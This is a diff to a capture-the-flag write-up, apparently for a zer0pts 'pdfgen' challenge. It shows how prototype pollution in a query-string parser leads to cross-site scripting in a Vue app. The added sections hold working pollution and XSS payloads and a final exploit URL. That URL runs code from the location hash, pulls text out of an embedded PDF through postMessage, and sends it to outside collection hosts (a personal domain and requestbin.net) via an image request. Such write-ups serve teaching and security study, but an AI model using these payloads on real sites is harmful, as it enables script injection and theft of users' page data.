@@ -1,6 +1,7 @@
-### Introduction
 
-```
+### Challenge Intro
+
+```javascript
 app.get('/text', urlencodedParser, (req, res) => {
   const ip = req.connection.remoteAddress
   let pdfDoc = new PDFDocument;
@@ -18,7 +19,7 @@ app.get('/text', urlencodedParser, (req, res) => {
 
 ```
 
-```
+```javascript
   <script>
   var params = parseQuery(location.search.slice(1));
   var app = new Vue({
@@ -90,7 +91,7 @@ app.get('/text', urlencodedParser, (req, res) => {
 5. `current[lastPart] = valueDeserializer(value);`
 
 
-### Pollution
+### Prototype Pollution
 
 http://localhost:8081/text?text=asd123&a[constructor][prototype][pollute]=pollutedxyz
 
@@ -98,3 +99,44 @@ http://localhost:8081/text?text=asd123&a[constructor][prototype][pollute]=pollut
 2. `params.__proto__`
 3. `Object.__proto__.pollute`
 4. `document.__proto__.pollute`
+
+### VueJS - XSS Payloads
+
+```javascript
+var params = parseQuery(`constructor[prototype][props][][value]=a&constructor[prototype][name]=":''.constructor.constructor('alert(1337)')(),"`)
+
+var params = parseQuery(`constructor[prototype][v-if]=_c.constructor('alert(1337)')()`)
+
+var params = parseQuery('constructor[prototype][data]=a&constructor[prototype][template][nodeType]=a&constructor[prototype][template][innerHTML]="<script>alert(1337)<\/script>"')
+```
+
+### PostMessage to PDF
+
+```javascript
+document.getElementsByTagName('embed')[0].postMessage({type:'selectAll'}, '*');
+document.getElementsByTagName('embed')[0].postMessage({type:'getSelectedText'}, '*');
+```
+
+# Final Payload
+
+```
+
+https://pdfgen.ctf.zer0pts.com:8443/text?texts=asd&a[constructor][prototype][props][][value]=a&a[constructor][prototype][name]=a":''.constructor.constructor('eval(decodeURIComponent(location.hash.slice(1)))')(),"a#
+
+window.addEventListener('message', (e) => {
+
+	if (e.data.type === 'getSelectedTextReply') {
+	   (new Image).src = ['https://ctf.s1r1us.ninja/1d9e11f1-9421-40d3-954f-8c2712c9d16e?data=', e.data.selectedText];
+    }
+
+});
+
+(async () => {
+	const wait = x => new Promise(r=>{setTimeout(r,x)});
+ 	document.getElementsByTagName('embed')[0].postMessage({type:'selectAll'}, '*');
+ 	document.getElementsByTagName('embed')[0].postMessage({type:'getSelectedText'}, '*');
+})();
+```
+
+
+http://localhost:8081/text?text=flag{goes_here}&a[constructor][prototype][props][][value]=a&a[constructor][prototype][name]=a%22:%27%27.constructor.constructor(%27eval(decodeURIComponent(location.hash.slice(1)))%27)(),%22a#%20window.addEventListener('message',%20(e)%20=%3E%20{%20if%20(e.data.type%20===%20'getSelectedTextReply')%20{%20(new%20Image).src%20=%20['https://requestbin.net/r/h4c60l9y?data=',%20e.data.selectedText];%20}%20});%20(async%20()%20=%3E%20{%20const%20wait%20=%20x%20=%3E%20new%20Promise(r=%3E{setTimeout(r,x)});%20document.getElementsByTagName('embed')[0].postMessage({type:'selectAll'},%20'*');%20document.getElementsByTagName('embed')[0].postMessage({type:'getSelectedText'},%20'*');%20})();
